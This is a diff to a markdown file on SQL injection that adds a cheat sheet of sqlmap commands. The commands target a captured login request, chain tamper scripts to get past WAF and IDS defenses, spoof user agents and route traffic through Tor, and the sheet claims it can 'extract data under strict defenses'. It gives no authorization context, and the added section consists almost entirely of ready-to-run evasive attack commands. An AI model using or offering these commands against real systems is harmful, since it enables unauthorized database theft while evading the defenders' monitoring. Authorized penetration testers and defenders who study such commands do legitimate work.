@@ -48,3 +48,136 @@ To prevent SQL Injection attacks, it is essential to implement strong security p
 - [TalkTalk Breach (2015)](https://www.bbc.com/news/uk-34611857)
 
 ---
+
+
+# Simplified SQLMap Command Guide
+
+---
+
+## 📌 Basic Command
+
+```bash
+sqlmap -r login.txt --batch --dbs
+```
+
+---
+
+## 🕵️‍♂️ Use Random User-Agent
+
+```bash
+sqlmap -r login.txt --batch --dbs --random-agent
+```
+
+---
+
+## 🌍 Use a Proxy
+
+### 🔸 HTTP Proxy
+```bash
+sqlmap -r login.txt --batch --dbs --proxy="http://127.0.0.1:8080"
+```
+
+### 🔸 SOCKS Proxy (e.g., Tor)
+```bash
+sqlmap -r login.txt --batch --dbs --proxy="socks5://127.0.0.1:9050"
+```
+
+---
+
+## 🛠️ Tamper Scripts for WAF Bypass
+
+### 🔹 Single Tamper
+```bash
+sqlmap -r login.txt --batch --dbs --tamper=space2comment
+```
+
+### 🔹 Multiple Tampers
+```bash
+sqlmap -r login.txt --batch --dbs --tamper=space2comment,between,charunicodeencode
+```
+
+---
+
+## 🧪 Combined Evasion Examples
+
+### 🔸 Tamper + Random-Agent + Proxy
+```bash
+sqlmap -r login.txt --batch --dbs --random-agent --proxy="http://127.0.0.1:8080" --tamper=space2comment,between,charunicodeencode
+```
+
+### 🔸 Deep Obfuscation (Tor + Multiple Tampers)
+```bash
+sqlmap -r login.txt --batch --dbs --random-agent --proxy="socks5://127.0.0.1:9050" --tamper=charunicodeencode,space2comment,between,unmagicquotes,randomcase
+```
+
+## **Bypass most WAF/IDS setups**, **evade filters**, and extract data under strict defenses 
+
+
+### 💣 Complex SQLMap WAF Bypass Command
+
+```bash
+sqlmap -r login.txt \
+--batch \
+--flush-session \
+--random-agent \
+--threads=10 \
+--level=5 \
+--risk=3 \
+--technique=BEUSTQ \
+--dbms=mysql \
+--time-sec=10 \
+--delay=1 \
+--timeout=30 \
+--retries=3 \
+--proxy="socks5://127.0.0.1:9050" \
+--tamper=space2comment,between,charunicodeencode,randomcase,apostrophemask,unmagicquotes,space2plus,modsecurityversioned,modsecurityzeroversioned
+```
+
+---
+
+### 🛠️ Explanation of Each Flag
+
+| Option | Description |
+|--------|-------------|
+| `-r login.txt` | HTTP request file (capture from Burp) |
+| `--batch` | Non-interactive mode |
+| `--flush-session` | Ignore cached results |
+| `--random-agent` | Spoof User-Agent |
+| `--threads=10` | Parallel requests |
+| `--level=5 --risk=3` | Deep and risky tests |
+| `--technique=BEUSTQ` | Use all SQLi techniques |
+| `--dbms=mysql` | Assume MySQL to speed up |
+| `--time-sec=10` | Increase time-based payload timeout |
+| `--delay=1` | Delay between requests |
+| `--timeout=30` | Max wait per response |
+| `--retries=3` | Retry on timeout |
+| `--proxy="socks5://127.0.0.1:9050"` | Tor anonymization proxy |
+| `--tamper=...` | Combo of tamper scripts for WAF evasion |
+
+---
+
+
+## ⚙️ Useful Flags
+
+| Flag | Description |
+|------|-------------|
+| `--threads=10` | Enable multithreading |
+| `--level=5 --risk=3` | Deep and risky testing |
+| `--delay=1 --timeout=30` | Timing control |
+| `--technique=BEUSTQ` | Use specific SQLi types |
+| `--dbms=mysql` | Assume backend DBMS |
+| `--flush-session` | Clear previous results |
+| `--batch` | Non-interactive mode |
+
+---
+
+## 📝 Tips
+
+- ✔️ Make sure `login.txt` is properly formatted (HTTP request)
+- ✔️ Use `--flush-session` to avoid cached data
+- ✔️ Try simple injections manually before automation
+- ✔️ Combine tamper scripts cautiously
+
+
+
+
